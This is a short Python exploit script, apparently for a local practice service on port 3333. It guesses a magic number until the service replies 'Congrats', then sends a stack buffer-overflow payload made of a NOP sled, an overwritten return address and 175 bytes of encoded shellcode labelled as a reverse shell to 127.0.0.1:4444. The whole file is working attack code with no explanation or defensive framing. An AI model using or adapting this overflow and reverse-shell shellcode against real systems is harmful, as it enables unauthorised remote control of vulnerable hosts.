import time
import socket

# Reverse shell on 127.0.0.1:4444, len 175
reverse_shell=(
b"\x48\x31\xc9\x48\x81\xe9\xef\xff\xff\xff\x48\x8d\x05\xef\xff"
b"\xff\xff\x48\xbb\x39\x38\x3f\x1f\xec\x5b\xe9\x07\x48\x31\x58"
b"\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x71\x09\xc0\x75\xe5\x03"
b"\x70\xb1\x29\x70\xb6\xc9\xa1\x6a\x20\x6d\x1b\x79\x65\xad\xeb"
b"\x54\xec\x4f\xbc\xf8\x47\x4e\x86\x51\xa8\x5e\x69\x52\x16\x47"
b"\x75\x31\xeb\x58\x53\x39\x61\x10\xe9\x13\x6c\xc7\x41\x03\x77"
b"\x88\xa4\xe2\xeb\x07\x28\x64\x40\x1f\xec\x5a\xb8\x4f\xb0\xde"
b"\x55\x0f\xb6\x31\xc3\x5f\x36\x3d\x66\x57\x69\x9b\x90\x22\x70"
b"\xc7\xf6\x6b\xf4\x0c\x83\x24\x61\x52\x3f\x75\xe9\x13\x60\xe0"
b"\x71\x09\xc9\x10\xe9\x02\xb0\x58\x71\xbd\xff\x66\x2b\x31\xd5"
b"\x5f\x53\x39\x60\x10\xe9\x05\x83\x21\x63\x37\x3a\x57\x69\x9b"
b"\x91\xea\xc6\xde\x3f\x1f\xec\x5b\xe9\x07")

paddr = b'\x40\xe0\xff\xff\xff\x7f\x00\x00'
overwrite = b'\x90'*120 + paddr 
nops = b'\x90'*16
#payload = overwrite + nops + reverse_shell + b'\n'
payload = overwrite + reverse_shell + b'\n'
#payload = b'\x24\x70\n'

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('127.0.0.1', 3333))
s.settimeout(2.0)
r = s.recv(1024)
print(r)

# Loop until we get the magic number right
while b'Congrats' not in r:
    s.sendall(b'84\n')
    r = s.recv(1024)
    print(f'No, incorrect: {r}')


print('There we go, we got the correct number! Sending poison ...')
s.send(payload)

